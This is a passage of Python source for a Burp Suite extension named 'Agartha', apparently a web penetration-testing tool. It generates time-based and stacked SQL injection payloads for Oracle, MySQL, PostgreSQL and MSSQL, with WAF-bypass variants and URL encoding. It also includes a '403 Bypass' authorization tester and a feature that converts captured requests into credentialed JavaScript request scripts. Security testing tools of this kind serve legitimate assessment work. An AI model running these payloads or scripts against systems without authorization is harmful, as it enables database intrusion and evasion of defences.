                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),60) as integer)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as varchar2(10))") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as integer)") + " from dual" + "\n")
                                            if self._cbSqlWafBypass.isSelected():
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((\\'a\\'),60)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((\\'a\\'),60)") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),60) as varchar2(10))") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),60) as integer)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),60) as varchar2(10))") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),60) as integer)") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((''a''),60)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((''a''),60)") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((''a''),60) as varchar2(10))") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((''a''),60) as integer)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((''a''),60) as varchar2(10))") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((''a''),60) as integer)") + " from dual" + "\n")
                                unionPhrase += ","

        for prefix in prefixes:
            for escapeChar in escapeChars:
                if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                        continue
                for suffix in suffixes[1:]:
                    if self._cbOracleBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select banner from v$version" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + ";select version from v$instance" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + ";select banner from v$version" + "\n")
                                listSQLi.append(prefix + ";select version from v$instance" + "\n")
                                listSQLi.append(prefix + ";select banner from v$version" + suffix + "\n")
                                listSQLi.append(prefix + ";select version from v$instance" + suffix + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60) else null end from dual " + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + "\n")
                                listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message(1,60) else null end from dual " + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message(1,60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,60)" + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message(1,60)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,60)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,60)" + "\n")
                            else:
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),60) else null end from dual" + suffix + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),60) else null end from dual" + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,60) else null end from dual" + suffix + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,60) else null end from dual" + "\n")
                                if self._cbSqlWafBypass.isSelected():
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),60) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),60) else null end from dual" + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,60) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,60) else null end from dual" + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then ''a''||dbms_pipe.receive_message((''a''),60) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then ''a''||dbms_pipe.receive_message((''a''),60) else null end from dual" + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then ''a''||dbms_pipe.receive_message(1,60) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then ''a''||dbms_pipe.receive_message(1,60) else null end from dual" + "\n")
                    if self._cbMysqlBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + ";select @@version" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " or sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from (select sleep(60))A)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from (select sleep(60))A)" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + " and sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + " and sleep(60)" + "\n")
                                listSQLi.append(prefix + " or sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + " or sleep(60)" + "\n")
                                listSQLi.append(prefix + ";select sleep(60)" + "\n")
                                listSQLi.append(prefix + ";select sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(60))A)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(60))A)" + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(60))A)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(60))A)" + "\n")
                                listSQLi.append(prefix + "sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + "sleep(60)" + "\n")
                    if self._cbPostgreBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select version()" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + ";select version()" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select pg_sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " || pg_sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from pg_sleep(60))" + suffix + "\n")                                    
                                listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from pg_sleep(60))" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + ";select pg_sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + ";select pg_sleep(60)" + "\n")
                                listSQLi.append(prefix + " || pg_sleep(60)" + "\n")
                                listSQLi.append(prefix + " || pg_sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(60))" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(60))" + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(60))" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(60))" + "\n")
                    if self._cbMssqlBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select @@version" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + " waitfor delay " + escapeChar + "00:01" + escapeChar + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + ";waitfor delay " + escapeChar + "00:01" + escapeChar + suffix + "\n")
                            else:
                                listSQLi.append(prefix + " waitfor delay '00:01'" + suffix + "\n")
                                listSQLi.append(prefix + " waitfor delay '00:01'" + "\n")
                                listSQLi.append(prefix + ";waitfor delay '00:01'" + suffix + "\n")
                                listSQLi.append(prefix + ";waitfor delay '00:01'" + "\n")
                                if self._cbSqlWafBypass.isSelected():
                                    listSQLi.append(prefix + " waitfor delay \\'00:01\\'" + suffix + "\n")
                                    listSQLi.append(prefix + " waitfor delay \\'00:01\\'" + "\n")
                                    listSQLi.append(prefix + ";waitfor delay \\'00:01\\'" + suffix + "\n")
                                    listSQLi.append(prefix + ";waitfor delay \\'00:01\\'" + "\n")
                                    listSQLi.append(prefix + " waitfor delay ''00:01''" + suffix + "\n")
                                    listSQLi.append(prefix + " waitfor delay ''00:01''" + "\n")
                                    listSQLi.append(prefix + ";waitfor delay ''00:01''" + suffix + "\n")
                                    listSQLi.append(prefix + ";waitfor delay ''00:01''" + "\n")
        listSQLi = list(set(listSQLi))
        listSQLi.sort()
        if self._cbSqlEncoding.isSelected():
            listSQLi = self.encodeURL(listSQLi)
        self._tabDictResultDisplay.setText(''.join(map(str, listSQLi)))
        self._lblStatusLabel.setText('SQL Injection payload generation is returned with '+ str(len(listSQLi)) + ' records!')
        return

    def encodeURL(self, payloads):
        urlList = []
        for payload in payloads:
            urlList.append(payload.replace(" ", "%20").replace("\"", "%22").replace("\\", "%5c").replace("=", "%3d").replace("<", "%3c").replace(";", "%3b").replace("|", "%7c").replace("&", "%26").replace(":", "%3a").replace("`", "%60").replace("#", "%23").replace("\\", "%5c").replace("/", "%2f"))
        return urlList

    def getTabCaption(self):
        return "Agartha"

    def getUiComponent(self):
        return self._MainTabs

    def getHttpService(self):
        if self._MainTabs.getSelectedIndex() == 1:
            return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getHttpService()
        elif self._MainTabs.getSelectedIndex() == 2:
            return self._httpReqResAuthentication[self.tableMatrixAuthentication.getSelectedRow()][self.tableMatrixAuthentication.getSelectedColumn()].getHttpService()

    def getRequest(self):
        if self._MainTabs.getSelectedIndex() == 1:
            return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getRequest()
        elif self._MainTabs.getSelectedIndex() == 2:
            return self._httpReqResAuthentication[self.tableMatrixAuthentication.getSelectedRow()][self.tableMatrixAuthentication.getSelectedColumn()].getRequest()

    def getResponse(self):
        if self._MainTabs.getSelectedIndex() == 1:
            return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getResponse()
        elif self._MainTabs.getSelectedIndex() == 2:
            return self._httpReqResAuthentication[self.tableMatrixAuthentication.getSelectedRow()][self.tableMatrixAuthentication.getSelectedColumn()].getResponse()

    def createMenuItems(self, invocation):
        self.context = invocation
        menu_list = ArrayList()
        menu_list.add(JMenuItem("Auth Matrix", actionPerformed=self.agartha_menu))
        menu_list.add(JMenuItem("403 Bypass", actionPerformed=self.authentication_menu))
        menu_list.add(JMenuItem("Copy as JavaScript", actionPerformed=self.js_menu))
        return menu_list

    def js_menu(self, event):
        # right click menu
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        http_contexts = self.context.getSelectedMessages()
        _req = self._helpers.bytesToString(http_contexts[0].getRequest())
        _url = str(self._helpers.analyzeRequest(http_contexts[0]).getUrl())
        if _url.startswith("https"):
            _url = _url.replace(":443/", "/")
        elif _url.startswith("http"):
            _url = _url.replace(":80/", "/")

        method = _req.splitlines()[0].split(" ", 1)[0]

        if "]" in _req.splitlines()[-1][-1:] or "}" in _req.splitlines()[-1][-1:] or ">" in _req.splitlines()[-1][-1:]:
            jscript = "JSON/XML is not supported yet :/"
        else:
            fullHeader = ""
            for _reqLine in _req.splitlines()[1:-1]:
                if _reqLine and not any(re.findall(r'(cookie|token|auth|content-length)(.*:)', _reqLine, re.IGNORECASE)):
                    fullHeader += "xhr.setRequestHeader('" + _reqLine.split(":", 1)[0] + "','" + _reqLine.split(":", 1)[1] + "');"

            if method == "GET":
                minHeader = "var xhr=new XMLHttpRequest();xhr.open('GET','" + _url + "');xhr.withCredentials=true;"
                jscript = "Http request with minimum header paramaters in JavaScript:\n\t<script>" + minHeader + "xhr.send();</script>\n\n"
                jscript += "Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:\n\t<script>" + minHeader + fullHeader + "xhr.send();</script>"
            else:
                contentType = ""
                for _reqLine in _req.splitlines():
                    if any(re.findall(r'Content-type', _reqLine, re.IGNORECASE)):
                        contentType = "xhr.setRequestHeader('Content-type','" + _reqLine.split(" ", 1)[1] + "');"
                        break                    
                
                sendData = ""
                if _req.splitlines()[-1]:
                    sendData = "'" + _req.splitlines()[-1] + "'"
                
                minHeader = "var xhr=new XMLHttpRequest();xhr.open('" + method + "','" + _url + "');xhr.withCredentials=true;"
                jscript = "Http request with minimum header paramaters in JavaScript:\n\t<script>" + minHeader + contentType.strip() + "xhr.send(" + sendData + ");</script>\n\n"
                jscript += "Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:\n\t<script>" + minHeader + fullHeader + "xhr.send(" + sendData + ");</script>"
            jscript += "\n\nFor redirection, please also add this code before '</script>' tag:\n\txhr.onreadystatechange=function(){if (this.status===302){var location=this.getResponseHeader('Location');return ajax.call(this,location);}};"
        
        clipboard.setContents(StringSelection(jscript), None)

    def agartha_menu(self, event):
        # right click menu
        http_contexts = self.context.getSelectedMessages()
        _req = self._helpers.bytesToString(http_contexts[0].getRequest())
        _url = ""
        for http_context in http_contexts:
            _url += str(self._helpers.analyzeRequest(http_context).getUrl()) + "\n"

        if _url.startswith("https"):
            _url = _url.replace(":443/", "/")
        elif _url.startswith("http"):
            _url = _url.replace(":80/", "/")
        
        self._tbAuthHeader.setText(_req)
        self._tbAuthHeader.setSelectionStart(0)
        self._tbAuthHeader.setSelectionEnd(0)
        self._tbAuthURL.setText(_url)
        self._tbAuthURL.setSelectionStart(0)
        self._tbAuthURL.setSelectionEnd(0)
        self._MainTabs.setSelectedComponent(self._tabAuthSplitpane)
        self._MainTabs.getParent().setSelectedComponent(self._MainTabs)

        return

    def authentication_menu(self, event):
        # right click menu
        http_contexts = self.context.getSelectedMessages()
        try:
            for http_context in http_contexts:
                _url = str(self._helpers.analyzeRequest(http_context).getUrl())
                if _url.count('http') >=2:
                    # the url is already redirected to somewhere
                    continue
                if _url.startswith("https"):
                    _url = _url.replace(":443/", "/")
                elif _url.startswith("http"):
                    _url = _url.replace(":80/", "/")
                _header = self._helpers.analyzeRequest(http_context).getHeaders()
                _body = self._helpers.bytesToString(http_context.getRequest()[self._helpers.analyzeRequest(http_context).getBodyOffset():])

                self.tableMatrixAuthentication_DM.addRow([_url])
                self._urlAddresses.addElement(_url)
                self.authenticationMatrix.append([_url, _header, _body])

                self._btnAuthenticationRun.setEnabled(True)
                self._MainTabs.setSelectedComponent(self._tabAuthenticationSplitpane)
                self._MainTabs.getParent().setSelectedComponent(self._MainTabs)

            self.tabAuthenticationJlist.setSelectedIndex(0)
            self._lblAuthenticationNotification.text = "The request has been added to the table with all session identifiers. Blank is default color and different colors are for warning levels."
        except:
            self._lblAuthenticationNotification.text = "An error has occurred: " + str(sys.exc_info()[1])
        return

    def authMatrix(self, ev):
        t = Thread(target=self.authMatrixThread, args=[self])
        t.start()
        return

    def _updateReqResView(self, ev):
        try:
            row = self.tableMatrix.getSelectedRow()
            userID = self.tableMatrix.getSelectedColumn()
            if userID == 0:
                self._requestViewer.setMessage("", False)
                self._responseViewer.setMessage("", False)
            else:
                self._requestViewer.setMessage(self.httpReqRes[userID-1][row].getRequest(), False)
                self._responseViewer.setMessage(self.httpReqRes[userID-1][row].getResponse(), False)
        except:
            self._requestViewer.setMessage("", False)
            self._responseViewer.setMessage("", False)
    
    def isURLValid(self, urlAdd):
        if (urlparse.urlparse(urlAdd) and urlAdd.strip().startswith("http") and not " " in urlAdd.strip()) or urlAdd.isspace() or not urlAdd:
            return True
        else:
            return False

    def _tabAuthUI(self):
        # panel top
        self._tbAuthNewUser = JTextField("", 14)
        self._tbAuthNewUser.setToolTipText("Please provide an username.")
        self._btnAuthNewUserAdd = JButton("Add User", actionPerformed=self.authAdduser)
        self._btnAuthNewUserAdd.setPreferredSize(Dimension(90, 27))
        self._btnAuthNewUserAdd.setToolTipText("Please add user/s to populate role matrix!")
        self._btnAuthRun = JButton("RUN", actionPerformed=self.authMatrix)
        self._btnAuthRun.setPreferredSize(Dimension(150, 27))
        self._btnAuthRun.setToolTipText("Execute the task!")
        self._btnSiteMapGeneratorRun = JButton("Spider", actionPerformed=self.siteMapGenerator)
        self._btnSiteMapGeneratorRun.setPreferredSize(Dimension(90, 27))
        self._btnSiteMapGeneratorRun.setToolTipText("It crawls all the links the user can visit and populate URL list automatically.")
        self._btnAuthReset = JButton("Reset", actionPerformed=self.tableMatrixReset)
        self._btnAuthReset.setPreferredSize(Dimension(90, 27))
        self._btnAuthReset.setToolTipText("Clear all.")
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._tbAuthHeader = JTextPane()
        self._tbAuthHeader.setContentType("text")
        self._tbAuthHeader.setToolTipText("HTTP header belongs to the user. You can set up this field from right click: 'Extensions > Agartha > Authorization Matrix'.")
        self._tbAuthHeader.setEditable(True)
        self._tbAuthURL = JTextPane()
        self._tbAuthURL.setContentType("text")
        self._tbAuthURL.setToolTipText("URL paths can be accessible by the user. Please dont forget to remove logout links!")
        self._tbAuthURL.setEditable(True)
        self._cbAuthColoring = JCheckBox('Warnings', True, itemStateChanged=self._cbAuthColoringFunc)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthColoring.setToolTipText("Colors may help to a better analysis.")
        self._cbAuthGETPOST = JComboBox(('GET', 'POST', 'Dynamic'))
        self._cbAuthGETPOST.setSelectedIndex(2)
        self._cbAuthGETPOST.setToolTipText("Which HTTP method will be used for the test. Dynamic takes proxy history as reference.")

        self._cbSiteMapDepth = JComboBox(('Only current URL', 'Max crawl depth is 1', 'Max crawl depth is 2', 'Max crawl depth is 3', 'Max crawl depth is 4', 'Max crawl depth is 5', 'Max crawl depth is 6', 'Max crawl depth is 7', 'Max crawl depth is 8', 'Max crawl depth is 9', 'Max crawl depth is 10'))
        self._cbSiteMapDepth.setPreferredSize(Dimension(150, 27))
        self._cbSiteMapDepth.setSelectedIndex(3)
        self._cbSiteMapDepth.setToolTipText("Webpage spider depth. How many sub-links should the web crawler go?")

        # top panel
        _tabAuthPanel1 = JPanel(BorderLayout())
        _tabAuthPanel1.setBorder(EmptyBorder(0, 0, 10, 0))
        _tabAuthPanel1_A = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabAuthPanel1_A.setPreferredSize(Dimension(400, 105))
        _tabAuthPanel1_A.setMinimumSize(Dimension(400, 105))
        _tabAuthPanel1_A.add(self._btnAuthNewUserAdd)
        _tabAuthPanel1_A.add(self._tbAuthNewUser)
        _tabAuthPanel1_A.add(self._cbAuthGETPOST)
        _tabAuthPanel1_A.add(self._btnAuthReset)
        _tabAuthPanel1_A.add(self._btnAuthRun)
        _tabAuthPanel1_A.add(self._cbAuthColoring)
        _tabAuthPanel1_A.add(self._btnSiteMapGeneratorRun)
        _tabAuthPanel1_A.add(self._cbSiteMapDepth)
        _tabAuthPanel1_B = JScrollPane(self._tbAuthHeader, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        _tabAuthPanel1_C = JScrollPane(self._tbAuthURL, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        self._tabAuthSplitpaneHttp = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, _tabAuthPanel1_B, _tabAuthPanel1_C)
        self._tabAuthSplitpaneHttp.setResizeWeight(0.5)
        _tabAuthPanel1.add(_tabAuthPanel1_A, BorderLayout.WEST)
        _tabAuthPanel1.add(self._tabAuthSplitpaneHttp, BorderLayout.CENTER)
        # panel top

        # panel center
        self._lblAuthNotification = JLabel("", SwingConstants.LEFT)
        self.tableMatrix = []
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLs','No Authentication'))
        self.tableMatrix = JTable(self.tableMatrix_DM)
        self.tableMatrix.setAutoCreateRowSorter(False)
        self.tableMatrix.setSelectionForeground(Color.red)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.setOpaque(True)
        self.tableMatrix.setFillsViewportHeight(True)
        self.tableMatrix_SP = JScrollPane()
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        _tabAuthPanel2 = JPanel()
        _tabAuthPanel2.setLayout(BoxLayout(_tabAuthPanel2, BoxLayout.Y_AXIS))
        _tabAuthPanel2.add(self._lblAuthNotification, BorderLayout.NORTH)
        _tabAuthPanel2.add(self.tableMatrix_SP, BorderLayout.NORTH)
        self.progressBar = JProgressBar()
        self.progressBar.setMaximum(1000000)
        self.progressBar.setMinimum(0)
        _tabAuthPanel2.add( self.progressBar, BorderLayout.SOUTH)
        # panel center

        self._tabAuthPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthPanel.setResizeWeight(0.25)
        self._tabAuthPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self._tabAuthPanel.setTopComponent(_tabAuthPanel1)
        self._tabAuthPanel.setBottomComponent(_tabAuthPanel2)

        # panel bottom
        _tabsReqRes = JTabbedPane()        
        self._requestViewer = self._callbacks.createMessageEditor(self, False)
        self._responseViewer = self._callbacks.createMessageEditor(self, False)
        _tabsReqRes.addTab("Request", self._requestViewer.getComponent())
        _tabsReqRes.addTab("Response", self._responseViewer.getComponent())
        # panel bottom

        self._tabAuthSplitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthSplitpane.setResizeWeight(0.7)
        self._tabAuthSplitpane.setTopComponent(self._tabAuthPanel)
        self._tabAuthSplitpane.setBottomComponent(_tabsReqRes)

    def _tabAuthenticationUI(self):
        self._cbAuthenticationHost = JComboBox()
        self._cbAuthenticationHost.setPreferredSize(Dimension(250, 27))
        self._cbAuthenticationHost.setToolTipText("Target hostnames. If you dont see your target in here, please click 'Reset' button first.")

        self._cbAuthenticationType = JComboBox(('Local', 'SSO', 'mTLS'), itemStateChanged=self._cbAuthenticationTypeFunc)
        self._cbAuthenticationType.setPreferredSize(Dimension(120, 27))
        self._cbAuthenticationType.setSelectedIndex(0)
        self._cbAuthenticationType.setEnabled(False)

        self._btnAuthenticationFetchHistory = JButton("Load Requests", actionPerformed=self.historyFetcher)
        self._btnAuthenticationFetchHistory.setPreferredSize(Dimension(120, 27))
        self._btnAuthenticationFetchHistory.setToolTipText("Load http requests from proxy history.")

        self._btnAuthenticationReset = JButton("Reset", actionPerformed=self.resetAuthentication)
        self._btnAuthenticationReset.setPreferredSize(Dimension(120, 27))
        self._btnAuthenticationReset.setToolTipText("Reset the screen and re-load hostnames.")

        self._btnAuthenticationRun = JButton("RUN", actionPerformed=self.authenticationMatrixFunc)
        self._btnAuthenticationRun.setPreferredSize(Dimension(120, 27))
        self._btnAuthenticationRun.setToolTipText("Execute the task!")
        self._btnAuthenticationRun.setEnabled(False)

        # panel top
        _tabAuthenticationPanel1 = JPanel(BorderLayout())
        _tabAuthenticationPanel1.setBorder(EmptyBorder(0, 0, 10, 0))
        _tabAuthenticationPanel1_A = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabAuthenticationPanel1_A.setPreferredSize(Dimension(400, 105))
        _tabAuthenticationPanel1_A.setMinimumSize(Dimension(400, 105))

        _tabAuthenticationPanel1_A.add(self._cbAuthenticationHost)
        _tabAuthenticationPanel1_A.add(self._btnAuthenticationFetchHistory)
        _tabAuthenticationPanel1_A.add(self._btnAuthenticationReset)
        _tabAuthenticationPanel1_A.add(self._btnAuthenticationRun)
        _tabAuthenticationPanel1_A.add(self._cbAuthenticationType)

        self._urlAddresses = DefaultListModel()
        self.tabAuthenticationJlist = JList(self._urlAddresses)
        self.tabAuthenticationJlist.addListSelectionListener(self.listChange)
        self.tabAuthenticationJlist.setSelectionMode(DefaultListSelectionModel.SINGLE_SELECTION);
        self.tabAuthenticationJlist.setToolTipText("Queued requests.")

        self._tbAuthenticationHeader = JTextPane()
        self._tbAuthenticationHeader.setContentType("text")
        self._tbAuthenticationHeader.setToolTipText("Header details.")
        self._tbAuthenticationHeader.setEditable(False)
        self._tbAuthenticationHeader.setText("")

        _tabAuthenticationPanel1_B = JScrollPane(self.tabAuthenticationJlist, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        _tabAuthenticationPanel1_C = JScrollPane(self._tbAuthenticationHeader, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS)
        self._tabAuthenticationSplitpaneHttp = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, _tabAuthenticationPanel1_B, _tabAuthenticationPanel1_C)
        self._tabAuthenticationSplitpaneHttp.setResizeWeight(0.5)
        _tabAuthenticationPanel1.add(_tabAuthenticationPanel1_A, BorderLayout.WEST)
        _tabAuthenticationPanel1.add(self._tabAuthenticationSplitpaneHttp, BorderLayout.CENTER)
        # panel top

        # panel center
        self._lblAuthenticationNotification = JLabel("", SwingConstants.LEFT)
        self.tableMatrixAuthentication = []
        self.tableMatrixAuthentication_DM = CustomDefaultTableModel(self.tableMatrixAuthentication, ('URLs', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10'))
        self.tableMatrixAuthentication = JTable(self.tableMatrixAuthentication_DM)
        self.tableMatrixAuthentication.setAutoCreateRowSorter(False)
        self.tableMatrixAuthentication.setSelectionForeground(Color.red)
        self.tableMatrixAuthentication.getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
        self.tableMatrixAuthentication.getColumnModel().getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
        self.tableMatrixAuthentication.setOpaque(True)
        self.tableMatrixAuthentication.setFillsViewportHeight(True)
        self.tableMatrixAuthentication_SP = JScrollPane()
        self.tableMatrixAuthentication_SP.getViewport().setView((self.tableMatrixAuthentication))
        _tabAuthenticationPanel2 = JPanel()
        _tabAuthenticationPanel2.setLayout(BoxLayout(_tabAuthenticationPanel2, BoxLayout.Y_AXIS))
        _tabAuthenticationPanel2.add(self._lblAuthenticationNotification, BorderLayout.NORTH)
        _tabAuthenticationPanel2.add(self.tableMatrixAuthentication_SP, BorderLayout.NORTH)
        
        self.progressBarAuthenticationPanel = JProgressBar()
        self.progressBarAuthenticationPanel.setMaximum(1000000)
        self.progressBarAuthenticationPanel.setMinimum(0)
        _tabAuthenticationPanel2.add( self.progressBarAuthenticationPanel, BorderLayout.SOUTH)
        # panel center

        self._tabAuthenticationPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthenticationPanel.setResizeWeight(0.25)
